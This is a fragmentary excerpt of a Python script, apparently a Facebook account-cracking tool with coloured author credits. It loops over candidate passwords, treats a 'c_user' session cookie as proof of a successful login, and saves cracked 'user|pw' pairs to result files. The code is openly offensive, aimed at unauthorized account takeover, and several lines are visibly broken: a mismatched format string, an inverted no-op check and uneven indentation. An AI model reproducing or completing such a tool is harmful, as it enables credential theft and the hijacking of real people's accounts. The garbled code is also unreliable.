...
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          SHAHID-BASHIR
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           UNKNOW
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSahil_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSahil_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back SHAHID Menu ")
	    sarfraz()
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [Sahil-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
